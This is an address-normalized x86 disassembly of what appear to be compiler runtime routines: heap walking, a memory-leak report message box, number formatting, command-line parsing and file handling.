ffree st0
fincstp
sub_4035c0
mov ecx eax
mov edx ecx
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
add edx ecx
mov eax edx
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor eax eax
sub_4035e4
cmp [ rw-data ] 0x0
je r-xdata
add eax 0x10
retn
mov edx [ rw-data ]
cmp edx eax
jb r-xdata
mov edx eax
add edx 0x13fff0
cmp edx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x13ffe0
je r-xdata
xor eax eax
mov eax [ rw-data ]
jmp r-xdata
retn
sub_403624
push ebx
push esi
mov ebx eax
add ebx 0x20
mov [ edx ] ebx
mov edx [ eax ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov ebx esi
sub ebx 0x4
mov ebx [ ebx ]
and ebx 0xfffffff0
add ebx esi
movzx eax [ edx + 0x2 ]
sub ebx eax
mov [ ecx ] ebx
pop esi
pop ebx
retn
mov ebx [ edx + 0x8 ]
cmp ebx [ edx + 0xc ]
jbe r-xdata
mov eax [ edx + 0x8 ]
dec eax
mov [ ecx ] eax
pop esi
pop ebx
retn
sub_403660
push edi
mov edi edx
add eax 0x1
mov edx 0x89705f41
mul edx
shr eax 0x1e
mov ecx edx
and edx 0x1fffffff
shr ecx 0x1d
lea edx [ edx + edx * 4 ]
add edx eax
mov eax ecx
or eax 0x30
mov [ edi ] al
mov eax edx
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1c
and edx 0xfffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1b
and edx 0x7ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1a
and edx 0x3ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x19
and edx 0x1ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x18
and edx 0xffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x17
and edx 0x7fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x16
and edx 0x3fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x15
and edx 0x1fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x14
or eax 0x30
mov [ edi ] al
lea eax [ edi + 0x1 ]
pop edi
retn
sub_403794
push ebx
mov ebx edx
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
pop ebx
retn
add eax 0xffffffc8
mov eax [ eax ]
movzx ecx [ eax ]
inc eax
mov edx ebx
call sub_40377c
pop ebx
retn
sub_4037c8
push ebp
mov ebp esp
push ebx
mov edx eax
cmp edx 0xffff
jbe r-xdata
xor eax eax
test dl 0x3
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx eax
cmp edx ecx
ja r-xdata
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx - 0x10 ] ecx
push 0x1c
mov edx [ ebp + 0x8 ]
add edx 0xffffffe4
push edx
push eax
call sub_402578
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
add edx [ ebx - 0x10 ]
add ecx 0x4
cmp edx ecx
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x1000
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x4
jb r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
test [ eax - 0x8 ] 0xf6
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x7 ] 0x1
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_403844
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp edi 0x3e8
jge r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffa8
call sub_4037c8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffd0
call sub_4037c8
pop ecx
test al al
je r-xdata
mov eax ebx
add eax 0xffffffd0
mov esi [ eax ]
mov eax ebx
add eax 0xffffffa8
cmp ebx [ eax ]
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4037c8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ edi + 0x1 ]
mov eax [ esi ]
call sub_403844
pop ecx
test al al
jne r-xdata
sub_4038c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
push ebp
xor edx edx
mov eax ebx
call sub_403844
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
sub_4038ec
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
retn
push 0x4
push 0x1000
push 0x10000
push 0x0
call sub_4025ec
mov [ rw-data ] eax
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40274c
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_4025fc
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40274c
test al al
je r-xdata
push 0xa
call sub_4025fc
sub_403960
push ebx
mov ebx eax
call sub_4038ec
test al al
je r-xdata
xor eax eax
mov eax [ rw-data ]
cmp [ eax ] 0x3ffe
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov [ edx + eax * 4 + 0x4 ] ebx
mov eax [ rw-data ]
inc [ eax ]
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
sub_4039a0
push ebx
push esi
push edi
mov esi eax
mov edi rw-data
xor ebx ebx
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call sub_4038ec
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
dec edx
test edx edx
jl r-xdata
mov [ rw-data ] 0x0
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx ]
mov ecx [ edi ]
mov edx [ ecx + edx * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 + 0x4 ] edx
mov edx [ edi ]
dec [ edx ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi ]
cmp esi [ ecx + eax * 4 + 0x4 ]
jne r-xdata
sub_4039f8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax rw-data
shr eax 0x5
shl eax 0x8
mov edx [ ebp + 0x8 ]
lea esi [ edx + eax * 8 - 0x1b800 ]
lea ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_403624
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x28 ]
jbe r-xdata
mov eax [ ebp - 0x24 ]
sub eax 0x4
test [ eax ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
add [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
call sub_4039a0
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1b801 ] 0x0
xor ebx ebx
mov eax [ ebp - 0x24 ]
call sub_4038c4
mov edi eax
test edi edi
jne r-xdata
mov ebx 0x3
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x4 ] 0x100
jge r-xdata
cmp ebx 0xff
jg r-xdata
cmp [ esi + ebx * 8 ] 0x0
je r-xdata
inc [ esi + ebx * 8 + 0x4 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x2 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x1
je r-xdata
xor ebx ebx
mov [ esi + ebx * 8 ] edi
jmp r-xdata
inc ebx
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0xc ]
inc eax
imul [ ebp - 0x14 ]
add eax 0xc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp edi [ esi + ebx * 8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
sub eax 0x4
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov [ ebp - 0x1d ] 0x1
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0xc
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax 0xc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x20
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x20
jae r-xdata
mov ebx 0x2
jmp r-xdata
mov [ ebp - 0x1d ] al
add [ ebp - 0x1c ] 0x2
dec [ ebp - 0x2c ]
jne r-xdata
mov al 0x1
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x1d ] al
inc [ ebp - 0x18 ]
dec [ ebp - 0x2c ]
jne r-xdata
mov al 0x1
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
sub_403bb8
push ebp
mov ebp esp
push eax
mov eax 0x27
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff7e0
push ebx
push esi
push edi
lea eax [ ebp - 0x1b800 ]
xor ecx ecx
mov edx 0x1b800
call sub_404c14
lea eax [ ebp - 0x1f824 ]
xor ecx ecx
mov edx 0x4000
call sub_404c14
xor eax eax
mov [ ebp - 0x1b808 ] eax
mov [ ebp - 0x1b801 ] 0x1
mov edi [ rw-data ]
jmp r-xdata
cmp edi rw-data
jne r-xdata
mov eax edi
call sub_4035e4
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov edi [ edi + 0x4 ]
mov eax ebx
sub eax 0x4
mov esi [ eax ]
test esi 0x1
jne r-xdata
cmp ebx rw-data
je r-xdata
mov eax ebx
call sub_4035c0
mov ebx eax
test ebx ebx
jne r-xdata
test esi 0x4
je r-xdata
cmp [ ebp - 0x1b801 ] 0x0
jne r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jl r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jge r-xdata
push ebp
mov eax ebx
call sub_4039f8
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1b809 ] 0x0
xor eax eax
mov [ ebp - 0x1b818 ] eax
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
lea edx [ ebp - 0x27824 ]
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
mov [ ebp - 0x1b810 ] 0x37
mov [ ebp - 0x1b820 ] rw-data
lea eax [ ebp - 0x1b004 ]
mov [ ebp - 0x1b824 ] eax
mov eax ebx
add eax 0x10
call sub_4039a0
test al al
jne r-xdata
and esi 0xfffffff0
sub esi 0x4
mov [ ebp - 0x1b814 ] esi
mov eax ebx
call sub_4039a0
test al al
jne r-xdata
mov eax [ ebp - 0x1b81c ]
mov [ ebp - 0x1b818 ] eax
add [ ebp - 0x1b824 ] 0x800
add [ ebp - 0x1b820 ] 0x20
dec [ ebp - 0x1b810 ]
jne r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x1b801 ] 0x0
mov esi [ ebx + 0xc ]
and esi 0xfffffff0
sub esi 0x4
sub esi 0x10
mov eax [ ebp - 0x1b808 ]
mov [ ebp + eax * 4 - 0x1f824 ] esi
inc [ ebp - 0x1b808 ]
mov [ ebp - 0x1b801 ] 0x0
mov eax [ ebp - 0x1b808 ]
mov edx [ ebp - 0x1b814 ]
mov [ ebp + eax * 4 - 0x1f824 ] edx
inc [ ebp - 0x1b808 ]
mov eax [ ebp - 0x1b820 ]
movzx eax [ eax ]
sub eax 0x4
mov [ ebp - 0x1b81c ] eax
mov [ ebp - 0x1b80a ] 0x0
mov edi 0xff
mov eax [ ebp - 0x1b824 ]
mov esi eax
cmp [ ebp - 0x1b808 ] 0x0
jle r-xdata
dec edi
sub esi 0x8
cmp edi 0xffffffff
jne r-xdata
cmp [ ebp - 0x1b809 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
push 0x2010
mov eax [ rw-data ]
push eax
lea eax [ ebp - 0x27824 ]
push eax
push 0x0
call MessageBoxA
cmp [ ebp - 0x1b809 ] 0x0
je r-xdata
lea eax [ ebp - 0x20025 ]
cmp ebx eax
ja r-xdata
cmp [ ebp - 0x1b80a ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
mov [ ebp - 0x1b809 ] 0x1
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
mov esi [ ebp - 0x1b808 ]
dec esi
test esi esi
jb r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov eax [ ebp - 0x1b818 ]
inc eax
mov edx ebx
call sub_403660
mov ebx eax
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x2d
inc ebx
mov [ ebx ] 0x20
inc ebx
mov edx ebx
mov eax [ ebp - 0x1b81c ]
call sub_403660
mov ebx eax
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
mov [ ebp - 0x1b80a ] 0x1
jmp r-xdata
inc esi
xor edi edi
lea eax [ ebp - 0x1f824 ]
mov [ ebp - 0x1b824 ] eax
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax edi
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0x1b824 ]
mov eax [ eax ]
mov edx ebx
call sub_403660
mov ebx eax
lea eax [ ebp - 0x20025 ]
cmp ebx eax
ja r-xdata
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x78
inc ebx
mov [ ebx ] 0x20
inc ebx
mov eax [ esi ]
mov edx ebx
call sub_403660
mov ebx eax
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
jmp r-xdata
dec eax
je r-xdata
inc edi
add [ ebp - 0x1b824 ] 0x4
dec esi
jne r-xdata
mov eax [ rw-data ]
call sub_406bd4
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_40377c
mov ebx eax
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
mov edx ebx
call sub_403794
mov ebx eax
sub_403f9c
push esi
push edi
xor eax eax
xor esi esi
mov edx rw-data
movzx edi [ edx ]
shr edi 0x3
mov ecx esi
add ecx ecx
add ecx ecx
cmp edi eax
jbe r-xdata
test [ edx ] 0xf
jne r-xdata
mov eax edi
mov [ eax + rw-data ] cl
inc eax
cmp edi eax
ja r-xdata
inc esi
add edx 0x20
cmp esi 0x37
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
retn
sub_403fe0
push ebx
push esi
push edi
mov esi 0x37
mov ebx rw-data
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x8 ] eax
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x18 ] eax
xor eax eax
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x14 ] 0x1
movzx eax [ ebx - 0x1a ]
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0xef
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
mov [ ebx ] sub_40288c
add eax 0x4d0
shr eax 0xd
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
mov ecx eax
mov dl 0xff
shl dl cl
mov [ ebx - 0x1b ] dl
shl eax 0xd
add ax 0xb30
mov [ ebx - 0x4 ] ax
movzx edi [ ebx - 0x1a ]
movzx eax di
mov ecx eax
shl ecx 0x4
lea ecx [ ecx + ecx * 2 ]
add ecx 0xef
and ecx 0xffffff00
add ecx 0x30
cmp ecx 0x7330
jae r-xdata
mov eax 0x7
cmp ecx 0xff30
jbe r-xdata
mov ecx 0x7330
mov eax ecx
sub eax 0x20
movzx edx di
mov ecx edx
xor edx edx
div ecx
imul di
add ax 0xef
and ax 0xff00
add ax 0x30
mov [ ebx - 0x2 ] ax
add ebx 0x20
dec esi
jne r-xdata
mov ecx 0xff30
cmp [ ebx ] 0x0
jne r-xdata
call sub_403f9c
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov esi 0x400
mov edx rw-data
mov eax edx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add edx 0x8
dec esi
jne r-xdata
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
pop edi
pop esi
pop ebx
retn
sub_404108
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi [ ebx + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ edi + 0x4 ]
push 0x8000
push 0x0
push edi
call sub_4025f4
mov edi ebp
mov edx 0x37
mov eax rw-data
mov ecx eax
mov [ eax + 0x14 ] ecx
mov ecx eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
xor ecx ecx
mov [ eax + 0xc ] ecx
add eax 0x20
dec edx
jne r-xdata
mov [ ebx ] ebx
mov [ ebx + 0x4 ] ebx
mov edx 0x400
mov ecx rw-data
mov eax ecx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add ecx 0x8
dec edx
jne r-xdata
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebx + 0x4 ]
push 0x8000
push 0x0
push ebx
call sub_4025f4
mov ebx edi
mov [ esi ] esi
mov [ esi + 0x4 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404198
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call sub_402410
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_403bb8
call sub_404108
retn
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call sub_4025f4
xor eax eax
mov [ rw-data ] eax
sub_404238
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_404360
mov [ ecx ] eax
mov al 0x2
jmp sub_404360
retn
mov [ ecx ] eax
retn
sub_4042c8
push ebx
call sub_40a7e8
mov eax [ eax ]
test eax eax
je r-xdata
xor ebx ebx
mov ebx [ eax + 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call [ rw-data ]
jmp r-xdata
sub_404314
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x1a
ja r-xdata
call sub_40a7e8
mov ebx [ eax + 0x4 ]
jmp r-xdata
movzx eax bl
mov edx esi
call sub_404308
movzx eax bl
movzx ebx [ eax + rw-data ]
sub_4043c8
cmp eax edx
je r-xdata
retn
cmp ecx 0x20
ja r-xdata
jle r-xdata
sub ecx 0x8
jg r-xdata
retn
cmp eax edx
ja r-xdata
fild [ ecx + eax ]
fild [ eax ]
cmp ecx 0x8
jle r-xdata
jmp [ ecx * 4 + r-xdata ]
push edx
fild [ eax ]
lea eax [ ecx + eax - 0x8 ]
lea ecx [ edx + ecx - 0x8 ]
fild [ eax ]
push ecx
neg ecx
and edx 0xfffffff8
lea ecx [ edx + ecx + 0x8 ]
pop edx
sub edx ecx
cmp eax edx
lea edx [ ecx + edx ]
jbe r-xdata
fistp [ edx ]
fistp [ ecx + edx ]
fild [ eax + 0x8 ]
cmp ecx 0x10
jle r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
add ecx 0x8
jl r-xdata
fistp [ edx ]
pop edx
fistp [ edx ]
retn
sub ecx 0x8
push ecx
fild [ ecx + eax ]
fild [ eax ]
add ecx edx
and ecx 0xfffffff8
sub ecx edx
fistp [ edx + 0x8 ]
fild [ eax + 0x10 ]
fistp [ edx + 0x10 ]
fild [ ecx + eax ]
fistp [ ecx + edx ]
sub ecx 0x8
jg r-xdata
pop ecx
fistp [ edx ]
fistp [ ecx + edx ]
sub_4044c8
push ebx
push esi
push edi
push ebp
mov ebx edx
jmp r-xdata
movzx edx [ eax ]
test dx dx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
cmp dx 0x20
jbe r-xdata
xor edi edi
mov esi eax
jmp r-xdata
cmp [ eax + 0x2 ] 0x22
jne r-xdata
add eax 0x2
movzx ebp [ eax ]
cmp bp 0x20
ja r-xdata
add eax 0x4
jmp r-xdata
cmp bp 0x22
jne r-xdata
mov eax ebx
mov edx edi
call sub_40740c
mov eax esi
mov esi [ ebx ]
xor ecx ecx
jmp r-xdata
inc edi
add eax 0x2
add eax 0x2
jmp r-xdata
movzx edi [ eax ]
cmp di 0x20
ja r-xdata
movzx edx [ eax ]
test dx dx
je r-xdata
cmp di 0x22
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax ] 0x0
je r-xdata
cmp dx 0x22
jne r-xdata
mov [ esi + ecx * 2 ] di
add eax 0x2
inc ecx
add eax 0x2
jmp r-xdata
add eax 0x2
jmp r-xdata
inc edi
add eax 0x2
movzx edx [ eax ]
test dx dx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp dx 0x22
jne r-xdata
add eax 0x2
jmp r-xdata
mov [ esi + ecx * 2 ] dx
add eax 0x2
inc ecx
sub_404584
push ebx
push esi
push edi
add esp 0xfffffdf4
mov ebx edx
mov esi eax
mov eax ebx
xor edx edx
call sub_4070a8
test esi esi
jne r-xdata
call GetCommandLineW
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_402500
mov ecx eax
mov edx esp
mov eax ebx
call sub_4071e4
jmp r-xdata
add esp 0x20c
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4044c8
mov edi eax
test esi esi
je r-xdata
sub_4045e4
add esp 0xfffffff8
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call sub_4025b0
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_404644
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_404684
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_402460
test eax eax
jne r-xdata
xor eax eax
call sub_4024e8
cmp eax 0x6d
jne r-xdata
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4046c4
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
jne r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_402488
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
call sub_4024e8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov [ ebx + 0xc ] edx
sub_404710
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
mov eax [ ebx ]
call sub_404700
test al al
jne r-xdata
xor eax eax
pop ebx
retn
call sub_4024e8
pop ebx
retn
sub_404730
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] sub_404684
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_404710
mov [ esi + 0x20 ] sub_4046c0
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x250 ]
mov [ esi + 0x8 ] 0x80
mov [ esi + 0x24 ] sub_4046c0
mov [ esi + 0x14 ] eax
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call sub_402418
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_4046c4
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
cmp esi rw-data
jne r-xdata
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call sub_4024e8
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
push 0xfffffff5
push 0xfffffff4
jmp r-xdata
call sub_402450
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call GetFileSize
inc eax
je r-xdata
mov [ esi ] eax
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call sub_402410
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call sub_402478
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_4046c4
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x250 ]
push edx
push [ esi ]
call sub_402460
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x250 ] 0xe
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call sub_402478
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call sub_402470
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_4048e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
xor ecx ecx
mov edx 0x250
call sub_404c14
lea eax [ ebx + 0x250 ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x4 ] 0xd7b0
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov [ ebx + 0x8 ] 0x80
